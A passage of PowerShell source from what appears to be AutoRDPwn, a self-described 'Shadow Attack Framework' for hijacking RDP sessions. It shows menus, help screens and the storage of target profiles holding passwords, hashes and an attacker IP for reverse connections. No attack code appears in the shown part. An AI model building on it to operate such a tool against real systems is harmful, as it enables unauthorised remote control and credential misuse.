        if ($index -ge $categories.Count) { $index = $categories.Count - 1 }
    }
    else {
        $index = $index + $Delta
        if ($index -lt 0) { $index = $categories.Count - 1 }
        if ($index -ge $categories.Count) { $index = 0 }
    }
    Set-ARTuiCategory $categories[$index]
}

function Set-ARTuiSelectionEdge {
    param([switch]$Last)
    if ($script:ARTuiLevel -eq 'actions') {
        $actions = @(Get-ARCurrentActions)
        if ($actions.Count -eq 0) { return }
        if ($Last) { $script:ARSelectedId = [string]$actions[$actions.Count - 1].Id }
        else { $script:ARSelectedId = [string]$actions[0].Id }
        return
    }
    $categories = @(Get-ARCategoryListForDisplay)
    if ($categories.Count -eq 0) { return }
    if ($Last) { Set-ARTuiCategory $categories[$categories.Count - 1] }
    else { Set-ARTuiCategory $categories[0] }
}

function Test-ARTuiNumberExact {
    param([string]$Digits = '')
    if ([string]::IsNullOrWhiteSpace($Digits)) { return $false }
    if ($script:ARTuiLevel -eq 'categories') {
        $categories = @(Get-ARCategoryListForDisplay)
        $number = 0
        if (-not [int]::TryParse($Digits, [ref]$number)) { return $false }
        return ($number -ge 1 -and $number -le $categories.Count)
    }
    foreach ($action in @(Get-ARCurrentActions)) {
        if ($action.Id -eq $Digits) { return $true }
    }
    return $false
}

function Test-ARTuiNumberPrefix {
    param([string]$Digits = '')
    if ([string]::IsNullOrWhiteSpace($Digits)) { return $false }
    if ($script:ARTuiLevel -ne 'actions') { return $false }
    foreach ($action in @(Get-ARCurrentActions)) {
        $id = [string]$action.Id
        if ($id.Length -gt $Digits.Length -and $id.StartsWith($Digits, [System.StringComparison]::Ordinal)) { return $true }
    }
    return $false
}

function Read-ARTuiNumberInput {
    param([string]$FirstDigit = '')
    $buffer = $FirstDigit
    if ($script:ARTestMode) { return $buffer }
    $waited = 0
    $limit = 700
    while ($buffer.Length -lt 4 -and $waited -lt $limit) {
        $exact = Test-ARTuiNumberExact $buffer
        $ambiguous = Test-ARTuiNumberPrefix $buffer
        if ($exact -and -not $ambiguous) { break }
        $limit = if ($ambiguous) { 400 } else { 700 }
        $hasKey = $false
        try { $hasKey = [Console]::KeyAvailable } catch { $hasKey = $false }
        if ($hasKey) {
            $next = [Console]::ReadKey($true)
            $character = $next.KeyChar.ToString()
            if ($character -match '^\d$') {
                $buffer += $character
                $waited = 0
            }
            else {
                $script:ARPendingKey = $next
                break
            }
        }
        else {
            Start-Sleep -Milliseconds 25
            $waited += 25
        }
    }
    return $buffer
}

function Resolve-ARTuiNumber {
    param([string]$Digits = '')
    if ([string]::IsNullOrWhiteSpace($Digits)) { return $false }
    $number = 0
    if (-not [int]::TryParse($Digits, [ref]$number)) { return $false }
    if ($script:ARTuiLevel -eq 'categories') {
        $categories = @(Get-ARCategoryListForDisplay)
        if ($number -ge 1 -and $number -le $categories.Count) {
            Set-ARTuiCategory $categories[$number - 1]
            return $true
        }
    }
    else {
        $actions = @(Get-ARCurrentActions)
        foreach ($action in $actions) {
            if ($action.Id -eq $Digits) {
                $script:ARSelectedId = $action.Id
                return $true
            }
        }
        if ($number -ge 1 -and $number -le $actions.Count) {
            $script:ARSelectedId = [string]$actions[$number - 1].Id
            return $true
        }
    }
    if ($Digits.Length -lt 2) { return $false }
    $code = Resolve-ARSelection $Digits
    if ($code -notlike 'ACTION:*') { return $false }
    $actionId = $code.Substring(7)
    $owner = Get-ARCategoryForAction $actionId
    if ($null -eq $owner) { return $false }
    $script:ARTuiLevel = 'actions'
    $script:ARSelectedCategoryKey = $owner.Key
    $script:ARSelectedId = $actionId
    $script:ARFilter = ''
    $script:ARScroll = 0
    return $true
}

function Step-ARTuiBack {
    if ($script:ARFilter -ne '') {
        $script:ARFilter = ''
        Set-ARStatus (Get-ARText 'txt154' 'Filter cleared') 'Info'
        return
    }
    if ($script:ARTuiLevel -eq 'actions') {
        Exit-ARTuiCategory
        return
    }
    Set-ARStatus (Get-ARText 'txt149' 'Top level - choose a category') 'Info'
}

function Resolve-ARSelection {
    param([string]$Selection)
    $value = ''
    if ($null -ne $Selection) { $value = $Selection.Trim() }
    if ($value -eq '') { return '' }
    $upper = $value.ToUpperInvariant()
    if ($upper -in @('Q', 'QUIT', 'X', 'EXIT')) { return 'QUIT' }
    if ($upper -in @('L', 'LANG', 'LANGUAGE')) { return 'LANGUAGE' }
    if ($upper -in @('T', 'TARGET')) { return 'TARGET' }
    if ($upper -in @('P', 'PROFILES', 'TARGETS')) { return 'PROFILES' }
    if ($upper -in @('S', 'SAVE')) { return 'SAVE' }
    if ($value -match '^1[1-7]$') {
        $mapped = $script:ARLegacyMap[$value]
        if ($mapped) { return 'ACTION:' + $mapped }
        return ''
    }
    $action = Get-ARActionById $value
    if ($action) { return 'ACTION:' + $action.Id }
    return ''
}

function Move-ARSelection {
    param([int]$Delta)
    Move-ARTuiSelection -Delta $Delta
}

function Get-ARTargetUserLabel {
    if ($script:ARTarget['User']) { return $script:ARTarget['User'] }
    return [Environment]::UserName
}

function Get-ARVersionLabel {
    if ($null -ne $script:ARVersion -and -not [string]::IsNullOrWhiteSpace([string]$script:ARVersion)) {
        return [string]$script:ARVersion
    }
    return '6.0'
}

function Format-ARItemCount {
    param([int]$Count = 0, [string]$Plural = 'items')
    if ($Count -eq 1) {
        if ($Plural.Length -gt 1 -and $Plural.EndsWith('s')) {
            return ('1 ' + $Plural.Substring(0, $Plural.Length - 1))
        }
        return ('1 ' + $Plural)
    }
    return ('{0} {1}' -f $Count, $Plural)
}

function Format-ARBoxText {
    param(
        [AllowNull()][string]$Text,
        [int]$MaxWidth
    )
    if ($MaxWidth -lt 1) { return '' }
    if ($null -eq $Text) { return '' }
    $flat = ($Text -replace '[\r\n\t]+', ' ')
    if ($flat.Length -le $MaxWidth) { return $flat }
    if ($MaxWidth -le 3) { return $flat.Substring(0, $MaxWidth) }
    return $flat.Substring(0, $MaxWidth - 3) + '...'
}

function Format-ARLeader {
    param(
        [string]$Label = '',
        [string]$Right = '',
        [int]$Width = 0,
        [string]$Fill = '.'
    )
    if ($Width -lt 1) { return '' }
    $left = Format-ARBoxText $Label $Width
    $right = Format-ARBoxText $Right $Width
    $space = $Width - $left.Length - $right.Length
    if ($space -le 0) {
        return (Format-ARBoxText ($left + ' ' + $right) $Width)
    }
    if ($space -eq 1) { return ($left + ' ' + $right) }
    $fill = $Fill * ($space - 2)
    return ($left + ' ' + $fill + ' ' + $right)
}

function Write-ARBoxBorder {
    param(
        [int]$Width,
        [string]$Color = 'DarkCyan'
    )
    $inner = [Math]::Max(0, $Width - 2)
    Write-ARLine ('+' + ('-' * $inner) + '+') $Color
}

function Write-ARBoxRule {
    param(
        [int]$Width,
        [string]$Label = '',
        [string]$Color = 'DarkCyan'
    )
    $inner = [Math]::Max(0, $Width - 2)
    if ([string]::IsNullOrWhiteSpace($Label)) {
        Write-ARLine ('+' + ('-' * $inner) + '+') $Color
        return
    }
    $text = Format-ARBoxText $Label ($inner - 5)
    $segment = '-- ' + $text + ' '
    $fill = [Math]::Max(0, $inner - $segment.Length)
    Write-ARLine ('+' + $segment + ('-' * $fill) + '+') $Color
}

function Write-ARBoxLine {
    param(
        [AllowEmptyString()][string]$Text = '',
        [int]$Width,
        [string]$Color = 'Gray',
        [string]$Background = ''
    )
    $contentWidth = [Math]::Max(1, $Width - 4)
    $body = Format-ARBoxText $Text $contentWidth
    if ($body.Length -lt $contentWidth) { $body = $body.PadRight($contentWidth) }
    Write-ARLine ('| ' + $body + ' |') $Color $Background
}

function Write-ARBoxColumns {
    param(
        [string]$Left = '',
        [string]$Right = '',
        [int]$Width,
        [string]$Color = 'Gray',
        [string]$Background = ''
    )
    $contentWidth = [Math]::Max(1, $Width - 4)
    $leftText = Format-ARBoxText $Left $contentWidth
    $rightText = Format-ARBoxText $Right $contentWidth
    $space = $contentWidth - $leftText.Length - $rightText.Length
    if ($space -lt 1) {
        $rightText = ''
        $space = $contentWidth - $leftText.Length
    }
    $line = $leftText + (' ' * [Math]::Max(0, $space)) + $rightText
    if ($line.Length -lt $contentWidth) { $line = $line.PadRight($contentWidth) }
    if ($line.Length -gt $contentWidth) { $line = $line.Substring(0, $contentWidth) }
    Write-ARLine ('| ' + $line + ' |') $Color $Background
}

function Read-ARTuiInlineInput {
    param(
        [int]$Row = -1,
        [int]$Column = 0,
        [string]$Initial = '',
        [int]$MaxLength = 40,
        [scriptblock]$OnChange = $null
    )
    if ($script:ARTestMode) { return $Initial }
    $buffer = [string]$Initial
    if ($buffer.Length -gt $MaxLength) { $buffer = $buffer.Substring(0, $MaxLength) }
    try {
        try { [Console]::CursorVisible = $true } catch { }
        while ($true) {
            if ($Row -ge 0) {
                try { [Console]::SetCursorPosition($Column + $buffer.Length, $Row) } catch { }
            }
            $key = [Console]::ReadKey($true)
            if ($key.Key -eq 'Enter') { return $buffer }
            if ($key.Key -eq 'Escape') { return $null }
            if ($key.Key -eq 'Delete') {
                $buffer = ''
            }
            elseif ($key.Key -eq 'Backspace') {
                if ($buffer.Length -gt 0) { $buffer = $buffer.Substring(0, $buffer.Length - 1) }
            }
            else {
                $character = $key.KeyChar
                if ($character -and -not [char]::IsControl($character) -and $buffer.Length -lt $MaxLength) {
                    $buffer += $character.ToString()
                }
            }
            if ($null -ne $OnChange) {
                try { & $OnChange $buffer } catch { }
            }
        }
    }
    catch { return $null }
    finally {
        try { [Console]::CursorVisible = $false } catch { }
    }
}

function Get-ARStatusColor {
    switch ($script:ARStatus['Kind']) {
        'Ok' { return 'Green' }
        'Warn' { return 'Yellow' }
        'Error' { return 'Red' }
        default { return 'DarkGray' }
    }
}

function Get-ARCategoryLabel {
    $category = Get-ARCurrentCategory
    if ($null -eq $category) { return '' }
    return [string]$category.Title
}

function Show-ARTuiScreen {
    param([string]$Prompt = '')

    $width = Get-ARConsoleWidth
    $boxWidth = [Math]::Max(40, $width - 1)
    $contentWidth = [Math]::Max(20, $boxWidth - 4)
    $listHeight = Get-ARTuiListHeight
    $script:ARTuiPromptRow = 0

    Initialize-ARTuiState

    $level = $script:ARTuiLevel
    $items = @()
    $selectedIndex = -1
    $scroll = 0
    $detailTitle = ''
    $detailRight = ''
    $detailText = ''
    $noun = Get-ARText 'txt147' 'categories'

    if ($level -eq 'categories') {
        $items = @(Get-ARCategoryListForDisplay)
        $current = Get-ARCurrentCategory
        if ($null -ne $current) {
            for ($i = 0; $i -lt $items.Count; $i++) {
                if ($items[$i].Key -eq $current.Key) { $selectedIndex = $i; break }
            }
            $detailTitle = [string]$current.Title
            $detailRight = Format-ARItemCount -Count $current.Actions.Count -Plural (Get-ARText 'txt146' 'actions')
            $detailText = [string]$current.Description
        }
        $scroll = $script:ARCategoryScroll
    }
    else {
        $noun = Get-ARText 'txt146' 'actions'
        $items = @(Get-ARCurrentActions)
        $current = Get-ARCurrentAction
        if ($null -ne $current) {
            for ($i = 0; $i -lt $items.Count; $i++) {
                if ($items[$i].Id -eq $current.Id) { $selectedIndex = $i; break }
            }
            $detailTitle = [string]$current.Title
            $detailRight = '[' + [string]$current.Id + ']'
            $detailText = [string]$current.Description
        }
        $scroll = $script:ARScroll
    }

    if ($selectedIndex -ge 0) {
        if ($selectedIndex -lt $scroll) { $scroll = $selectedIndex }
        if ($selectedIndex -ge ($scroll + $listHeight)) {
            $scroll = $selectedIndex - $listHeight + 1
        }
    }
    $maxScroll = [Math]::Max(0, $items.Count - $listHeight)
    if ($scroll -gt $maxScroll) { $scroll = $maxScroll }
    if ($scroll -lt 0) { $scroll = 0 }
    if ($level -eq 'categories') { $script:ARCategoryScroll = $scroll }
    else { $script:ARScroll = $scroll }

    Start-ARTuiFrame -Screen 'main'

    $adminLabel = if (Test-ARIsAdmin) { 'yes' } else { 'no' }
    Write-ARBoxBorder $boxWidth
    Write-ARBoxColumns -Left ('AutoRDPwn v' + (Get-ARVersionLabel) + ' - Shadow Attack Framework') -Right ('admin: ' + $adminLabel + '  |  ' + $script:ARLocaleName) -Width $boxWidth -Color 'Yellow'
    $targetLine = 'Target: {0}  User: {1}  Mode: {2}  Session: {3}' -f $script:ARTarget['Computer'], (Get-ARTargetUserLabel), $script:ARTarget['Mode'], $script:ARSessionState
    Write-ARBoxLine $targetLine $boxWidth 'Gray'
    Write-ARBoxBorder $boxWidth

    if ($level -eq 'categories') {
        $breadcrumb = 'AutoRDPwn'
    }
    else {
        $breadcrumb = 'AutoRDPwn > ' + (Get-ARCategoryLabel)
    }
    $counter = '{0}/{1} {2}' -f [Math]::Max(0, ($selectedIndex + 1)), $items.Count, $noun
    $filterLabel = ''
    if ($script:ARFilter -ne '') { $filterLabel = '[/ ' + $script:ARFilter + ']' }
    Write-ARBoxColumns -Left $breadcrumb -Right $filterLabel -Width $boxWidth -Color 'Cyan'

    $ruleLabel = if ($level -eq 'categories') { 'CATEGORIES' } else { 'ACTIONS' }
    Write-ARBoxRule -Width $boxWidth -Label $ruleLabel -Color 'DarkCyan'

    for ($row = 0; $row -lt $listHeight; $row++) {
        $index = $scroll + $row
        if ($index -ge $items.Count) {
            Write-ARBoxLine '' $boxWidth
            continue
        }
        $item = $items[$index]
        $selected = ($index -eq $selectedIndex)
        $marker = if ($selected) { '>' } else { ' ' }
        if ($level -eq 'categories') {
            $count = Format-ARItemCount -Count $item.Actions.Count -Plural (Get-ARText 'txt146' 'actions')
            $prefix = '{0} {1,2}. ' -f $marker, ($index + 1)
            $text = Format-ARLeader -Label ([string]$item.Title) -Right $count -Width ($contentWidth - $prefix.Length)
            $line = $prefix + $text
        }
        else {
            $prefix = '{0} {1,2}. ' -f $marker, ($index + 1)
            $idText = '[{0,3}]' -f [string]$item.Id
            $text = Format-ARBoxText ([string]$item.Title) ($contentWidth - $prefix.Length - 7)
            $line = $prefix + $idText + ' ' + $text
        }
        if ($selected) {
            Write-ARBoxLine $line $boxWidth 'Black' 'Cyan'
        }
        else {
            Write-ARBoxLine $line $boxWidth 'White'
        }
    }

    Write-ARBoxRule -Width $boxWidth -Label '' -Color 'DarkCyan'
    if ($items.Count -eq 0) {
        Write-ARBoxLine (' ' + (Get-ARText 'txt150' 'No item matches the current filter')) $boxWidth 'DarkGray'
        Write-ARBoxLine '' $boxWidth
        Write-ARBoxLine '' $boxWidth
    }
    else {
        Write-ARBoxColumns -Left $detailTitle -Right $detailRight -Width $boxWidth -Color 'Yellow'
        $descriptionLines = @(Get-ARWrappedLines -Text $detailText -Width ($contentWidth - 2) -MaxLines 2)
        for ($i = 0; $i -lt 2; $i++) {
            if ($i -lt $descriptionLines.Count) {
                Write-ARBoxLine (' ' + $descriptionLines[$i]) $boxWidth 'Gray'
            }
            else {
                Write-ARBoxLine '' $boxWidth
            }
        }
    }

    Write-ARBoxColumns -Left ('Status: ' + [string]$script:ARStatus['Text']) -Right $counter -Width $boxWidth -Color (Get-ARStatusColor)

    if ($Prompt -ne '') {
        $script:ARTuiPromptRow = $script:ARTuiFrameLine
        $filterText = 'Filter: ' + [string]$script:ARFilter
        Write-ARBoxColumns -Left $filterText -Right 'Enter apply  Esc cancel  Del clear' -Width $boxWidth -Color 'Yellow'
        Write-ARBoxLine ' Type to narrow the list, the selection follows the filter' $boxWidth 'DarkGray'
    }
    else {
        if ($level -eq 'categories') {
            Write-ARBoxLine ' Up/Down move   Enter open   digits select   / filter   R clear' $boxWidth 'DarkGray'
        }
        else {
            Write-ARBoxLine ' Up/Down move   Enter run   Esc/Backspace back   digits jump   / filter' $boxWidth 'DarkGray'
        }
        Write-ARBoxLine ' T target   P profiles   S save   L language   F1 help   Q quit' $boxWidth 'DarkGray'
    }
    Write-ARBoxBorder $boxWidth
}

function Show-ARHelp {
    param(
        [string]$Level = '',
        [string]$CategoryTitle = ''
    )
    if ([string]::IsNullOrWhiteSpace($Level)) { $Level = $script:ARTuiLevel }
    if ([string]::IsNullOrWhiteSpace($Level)) { $Level = 'categories' }
    if ([string]::IsNullOrWhiteSpace($CategoryTitle)) { $CategoryTitle = Get-ARCategoryLabel }

    $width = Get-ARConsoleWidth
    $boxWidth = [Math]::Max(40, $width - 1)

    Start-ARTuiFrame -Screen 'help'
    Write-ARBoxBorder $boxWidth
    Write-ARBoxColumns -Left ('AutoRDPwn v' + (Get-ARVersionLabel) + ' - help') -Right ('level: ' + $Level) -Width $boxWidth -Color 'Yellow'
    Write-ARBoxRule -Width $boxWidth -Label 'KEYS' -Color 'DarkCyan'
    if ($Level -eq 'categories') {
        $lines = @(
            'Up / Down / PgUp / PgDn   move between categories',
            'Home / End                first or last category',
            'Enter / Right             open the selected category',
            'Digits                    select a category',
            '/                         filter categories by name',
            'R                         clear the filter',
            'Esc / Backspace           clear the filter, stay on top',
            'T / P / S / L             target, profiles, save, language',
            'F1                        this help',
            'Q / X                     quit'
        )
    }
    else {
        $lines = @(
            'Up / Down / PgUp / PgDn   move between actions',
            'Home / End                first or last action',
            'Enter                     run the selected action',
            'Esc / Backspace / Left    back to the category list',
            'Digits                    jump by number or by action id',
            '                          (1..n for position, 101..704 for id)',
            '/                         filter actions in this category',
            'R                         clear the filter',
            'T / P / S / L             target, profiles, save, language',
            'F1                        this help',
            'Q / X                     quit'
        )
    }
    $height = Get-ARConsoleHeight
    $showNotes = $true
    if ((7 + $lines.Count + 4) -gt ($height - 1)) { $showNotes = $false }
    if ((7 + $lines.Count) -gt ($height - 1)) {
        if ($Level -eq 'categories') {
            $lines = @(
                'Up / Down    move',
                'Enter        open',
                'Digits       select',
                '/            filter',
                'Esc          clear the filter',
                'T/P/S/L      target, profiles, save, language',
                'F1           help',
                'Q / X        quit'
            )
        }
        else {
            $lines = @(
                'Up / Down    move',
                'Enter        run',
                'Esc          back',
                'Digits       jump',
                '/            filter',
                'T/P/S/L      target, profiles, save, language',
                'F1           help',
                'Q / X        quit'
            )
        }
    }
    foreach ($line in $lines) {
        Write-ARBoxLine (' ' + $line) $boxWidth 'Gray'
    }
    if ($showNotes) {
        Write-ARBoxRule -Width $boxWidth -Label 'NOTES' -Color 'DarkCyan'
        if ($Level -eq 'actions' -and $CategoryTitle -ne '') {
            Write-ARBoxLine (' Category: ' + $CategoryTitle) $boxWidth 'Cyan'
        }
        Write-ARBoxLine ' Legacy -option 11..17 maps to the first action of each old group.' $boxWidth 'DarkGray'
        Write-ARBoxLine ' Profiles remember the last used target and reload it at start.' $boxWidth 'DarkGray'
    }
    Write-ARBoxRule -Width $boxWidth -Label '' -Color 'DarkCyan'
    Write-ARBoxLine '' $boxWidth
    Write-ARBoxLine ' Press any key to return' $boxWidth 'Green'
    Write-ARBoxBorder $boxWidth
    if (-not $script:ARTestMode) {
        try { $null = [Console]::ReadKey($true) } catch { }
    }
}

function Get-ARTargetProfilesPath {
    if (-not [string]::IsNullOrWhiteSpace($script:ARTargetProfilesPath)) {
        return $script:ARTargetProfilesPath
    }
    if (-not [string]::IsNullOrWhiteSpace($script:ARTools)) {
        return (Join-Path $script:ARTools 'targets.json')
    }
    if (-not [string]::IsNullOrWhiteSpace($script:ARRoot)) {
        return (Join-Path $script:ARRoot 'Resources\Tools\targets.json')
    }
    return (Join-Path (Get-Location).Path 'targets.json')
}

function Get-ARTargetProfiles {
    $path = Get-ARTargetProfilesPath
    if (-not (Test-Path -LiteralPath $path)) { return @() }
    try {
        $raw = Get-Content -LiteralPath $path -Raw -ErrorAction Stop
        if ([string]::IsNullOrWhiteSpace($raw)) { return @() }
        $data = $raw | ConvertFrom-Json -ErrorAction Stop
        if ($null -eq $data) { return @() }
        return @($data)
    }
    catch { return @() }
}

function Protect-ARTargetSecret {
    param([string]$Value = '')
    if ([string]::IsNullOrEmpty($Value)) { return '' }
    $secure = ConvertTo-SecureString -String $Value -AsPlainText -Force -ErrorAction Stop
    return (ConvertFrom-SecureString -SecureString $secure -ErrorAction Stop)
}

function Unprotect-ARTargetSecret {
    param([string]$Value = '')
    if ([string]::IsNullOrEmpty($Value)) { return '' }
    try {
        $secure = ConvertTo-SecureString -String $Value -ErrorAction Stop
        $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
        try {
            return [Runtime.InteropServices.Marshal]::PtrToStringBSTR($bstr)
        }
        finally {
            [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
        }
    }
    catch { return '' }
}

function Get-ARTargetProfileDefaultName {
    $computer = [string]$script:ARTarget['Computer']
    if ([string]::IsNullOrWhiteSpace($computer)) { $computer = 'localhost' }
    $user = [string]$script:ARTarget['User']
    if ([string]::IsNullOrWhiteSpace($user)) { return $computer }
    return ($computer + ' - ' + $user)
}

function Save-ARTargetProfile {
    param([string]$Name = '')
    $profileName = $Name.Trim()
    if ($profileName -eq '') { $profileName = Get-ARTargetProfileDefaultName }
    $profiles = New-Object System.Collections.Generic.List[object]
    foreach ($profile in @(Get-ARTargetProfiles)) {
        if ([string]$profile.Name -ne $profileName) { $profiles.Add($profile) }
    }
    $profiles.Add([pscustomobject]@{
        Name              = $profileName
        Computer          = [string]$script:ARTarget['Computer']
        User              = [string]$script:ARTarget['User']
        PasswordProtected = Protect-ARTargetSecret ([string]$script:ARTarget['Password'])
        HashProtected     = Protect-ARTargetSecret ([string]$script:ARTarget['Hash'])
        Domain            = [string]$script:ARTarget['Domain']
        AttackerIP        = [string]$script:ARTarget['AttackerIP']
        Mode              = [string]$script:ARTarget['Mode']
    })
    $path = Get-ARTargetProfilesPath
    $directory = Split-Path -Parent $path
    if (-not [string]::IsNullOrWhiteSpace($directory) -and -not (Test-Path -LiteralPath $directory)) {
        New-Item -ItemType Directory -Path $directory -Force | Out-Null
    }
    $json = ConvertTo-Json -InputObject $profiles.ToArray() -Depth 3
    Set-Content -LiteralPath $path -Value $json -Encoding UTF8 -ErrorAction Stop
    Set-ARLastProfileName $profileName
    return $profileName
}

function Apply-ARTargetProfile {
    param($Profile)
    if ($null -eq $Profile) { return $false }
    foreach ($key in @('Computer', 'User', 'Domain', 'AttackerIP')) {
        $property = $Profile.PSObject.Properties[$key]
        if ($property) { $script:ARTarget[$key] = [string]$property.Value }
    }
    $modeProperty = $Profile.PSObject.Properties['Mode']
    if ($modeProperty -and ([string]$modeProperty.Value -in @('control', 'view'))) {
        $script:ARTarget['Mode'] = [string]$modeProperty.Value
    }
    $passwordProperty = $Profile.PSObject.Properties['PasswordProtected']
    if ($passwordProperty) {
        $script:ARTarget['Password'] = Unprotect-ARTargetSecret ([string]$passwordProperty.Value)
    }
    $hashProperty = $Profile.PSObject.Properties['HashProtected']
    if ($hashProperty) {
        $script:ARTarget['Hash'] = Unprotect-ARTargetSecret ([string]$hashProperty.Value)
    }
    $nameProperty = $Profile.PSObject.Properties['Name']
    if ($nameProperty -and -not [string]::IsNullOrWhiteSpace([string]$nameProperty.Value)) {
        Set-ARLastProfileName ([string]$nameProperty.Value)
    }
    return $true
}

function Get-ARLastProfilePath {
    $profilesPath = Get-ARTargetProfilesPath
    $directory = Split-Path -Parent $profilesPath
    if ([string]::IsNullOrWhiteSpace($directory)) {
        if (-not [string]::IsNullOrWhiteSpace($script:ARRoot)) { $directory = $script:ARRoot }
        else { $directory = (Get-Location).Path }
    }
    return (Join-Path $directory 'last.json')
}

function Get-ARLastState {
    $state = @{}
    try {
        $path = Get-ARLastProfilePath
        if (-not (Test-Path -LiteralPath $path)) { return $state }
        $raw = Get-Content -LiteralPath $path -Raw -ErrorAction Stop
        if ([string]::IsNullOrWhiteSpace($raw)) { return $state }
        $data = $raw | ConvertFrom-Json -ErrorAction Stop
        if ($null -eq $data) { return $state }
        if ($data -isnot [System.Management.Automation.PSCustomObject]) { return $state }
        foreach ($property in $data.PSObject.Properties) {
            if ([string]::IsNullOrWhiteSpace($property.Name)) { continue }
            $state[[string]$property.Name] = $property.Value
        }
    }
    catch { }
    return $state
}

function Save-ARLastState {
    param([hashtable]$State)
    if ($null -eq $State) { return }
    try {
        $payload = [pscustomobject]$State
        Set-Content -LiteralPath (Get-ARLastProfilePath) -Value (ConvertTo-Json -InputObject $payload -Depth 3) -Encoding UTF8 -ErrorAction Stop
    }
    catch { }
}

function Set-ARLastProfileName {
    param([string]$Name = '')
    if ([string]::IsNullOrWhiteSpace($Name)) { return }
    $state = Get-ARLastState
    $state['Name'] = $Name
    $state['Saved'] = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    Save-ARLastState -State $state
}

function Set-ARLastLanguage {
    param([string]$Name = '')
    if ([string]::IsNullOrWhiteSpace($Name)) { return }
    $state = Get-ARLastState
    $state['Language'] = $Name
    if (-not $state.ContainsKey('Saved')) {
        $state['Saved'] = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    }
    Save-ARLastState -State $state
}

function Get-ARLastLanguage {
    $state = Get-ARLastState
    if ($state.ContainsKey('Language')) { return [string]$state['Language'] }
    return ''
}

function Get-ARLastProfileName {
    try {
        $path = Get-ARLastProfilePath
        if (-not (Test-Path -LiteralPath $path)) { return '' }
        $data = Get-Content -LiteralPath $path -Raw -ErrorAction Stop | ConvertFrom-Json -ErrorAction Stop
        if ($data -and $data.PSObject.Properties['Name']) { return [string]$data.Name }
    }
    catch { }
    return ''
}

function Restore-ARLastProfile {
    $name = Get-ARLastProfileName
    if ([string]::IsNullOrWhiteSpace($name)) { return $false }
    foreach ($profile in @(Get-ARTargetProfiles)) {
        if ([string]$profile.Name -ne $name) { continue }
        if (Apply-ARTargetProfile $profile) {
            Set-ARStatus ((Get-ARText 'txt148' 'Last profile loaded') + ': ' + $name) 'Info'
            return $true
        }
    }
    Set-ARStatus ((Get-ARText 'txt148' 'Last profile loaded') + ': ' + $name + ' (missing)') 'Warn'
    return $false
}

function Save-ARCurrentTarget {
    try {
        $name = Save-ARTargetProfile
        Set-ARStatus ((Get-ARText 'txt133' 'Target saved') + ': ' + $name) 'Ok'
        return $true
    }
    catch {
        Set-ARStatus ((Get-ARText 'txt135' 'Could not save target') + ': ' + $_.Exception.Message) 'Error'
        return $false
    }
}

function Show-ARTargetProfilesScreen {
    param(
        [object[]]$Profiles,
        [int]$Index = 0
    )
    $width = Get-ARConsoleWidth
    $height = Get-ARConsoleHeight
    $boxWidth = [Math]::Max(40, $width - 1)
    $contentWidth = [Math]::Max(20, $boxWidth - 4)
    $listHeight = [Math]::Max(3, $height - 9)
    if ($Index -lt 0) { $Index = 0 }
    if ($Index -ge $Profiles.Count) { $Index = $Profiles.Count - 1 }
    $scroll = 0
    if ($Index -ge $listHeight) { $scroll = $Index - $listHeight + 1 }

    Start-ARTuiFrame -Screen 'profiles'
    Write-ARBoxBorder $boxWidth
    Write-ARBoxColumns -Left (Get-ARText 'txt136' 'Saved target profiles') -Right (Format-ARItemCount -Count $Profiles.Count -Plural 'profiles') -Width $boxWidth -Color 'Yellow'
    Write-ARBoxRule -Width $boxWidth -Label 'PROFILES' -Color 'DarkCyan'
    for ($row = 0; $row -lt $listHeight; $row++) {
        $profileIndex = $scroll + $row
        if ($profileIndex -ge $Profiles.Count) {
            Write-ARBoxLine '' $boxWidth
            continue
        }
        $profile = $Profiles[$profileIndex]
        $name = [string]$profile.Name
        if ([string]::IsNullOrWhiteSpace($name)) { $name = '(unnamed)' }
        $hostName = [string]$profile.Computer
        if ([string]::IsNullOrWhiteSpace($hostName)) { $hostName = 'localhost' }
        $marker = if ($profileIndex -eq $Index) { '>' } else { ' ' }
        $prefix = '{0} {1,2}. ' -f $marker, ($profileIndex + 1)
        $line = $prefix + (Format-ARLeader -Label $name -Right $hostName -Width ($contentWidth - $prefix.Length))
        if ($profileIndex -eq $Index) {
            Write-ARBoxLine $line $boxWidth 'Black' 'Cyan'
        }
        else {
            Write-ARBoxLine $line $boxWidth 'White'
        }
    }
    Write-ARBoxRule -Width $boxWidth -Label '' -Color 'DarkCyan'
    $selected = $Profiles[$Index]
    $selectedUser = [string]$selected.User
    if ([string]::IsNullOrWhiteSpace($selectedUser)) { $selectedUser = '(current user)' }
    Write-ARBoxLine (' {0}  |  user: {1}  |  mode: {2}' -f $selected.Computer, $selectedUser, $selected.Mode) $boxWidth 'White'
    Write-ARBoxLine (' ' + (Get-ARText 'txt123' 'Your IP for the reverse connection') + ': ' + ([string]$selected.AttackerIP)) $boxWidth 'Gray'
    Write-ARBoxLine ' Up/Down move   Enter load   Esc cancel' $boxWidth 'DarkGray'
    Write-ARBoxBorder $boxWidth
}

function Show-ARTargetPicker {
    $profiles = @(Get-ARTargetProfiles)
    if ($profiles.Count -eq 0) {
        Set-ARStatus (Get-ARText 'txt132' 'No saved targets. Edit a target and press S to save it.') 'Warn'
        return $false
    }
    $index = 0
    for ($i = 0; $i -lt $profiles.Count; $i++) {
        if ([string]$profiles[$i].Computer -eq [string]$script:ARTarget['Computer'] -and
            [string]$profiles[$i].User -eq [string]$script:ARTarget['User']) {
            $index = $i
            break
        }
    }
    while ($true) {
        Show-ARTargetProfilesScreen -Profiles $profiles -Index $index
        if ($script:ARTestMode) { return $false }
        try { $key = [Console]::ReadKey($true) } catch { return $false }
        switch ($key.Key) {
            'UpArrow' {
                $index--
                if ($index -lt 0) { $index = $profiles.Count - 1 }
            }
            'DownArrow' {
                $index++
                if ($index -ge $profiles.Count) { $index = 0 }
            }
            'Home' { $index = 0 }
            'End' { $index = $profiles.Count - 1 }
            'Enter' {
                $null = Apply-ARTargetProfile $profiles[$index]
                Set-ARStatus ((Get-ARText 'txt134' 'Target loaded') + ': ' + [string]$profiles[$index].Name) 'Ok'
                return $true
            }
            'Escape' { return $false }
            default {
                $character = $key.KeyChar.ToString().ToUpperInvariant()
                if ($character -eq 'Q') { return $false }
            }
        }
    }
}

function Show-ARTargetFormScreen {
    param([int]$Index)
    $width = Get-ARConsoleWidth
    $boxWidth = [Math]::Max(40, $width - 1)
    $contentWidth = [Math]::Max(20, $boxWidth - 4)
    $fields = @(
        @{ Key = 'Computer'; Label = 'Target host' },
        @{ Key = 'User'; Label = 'User' },
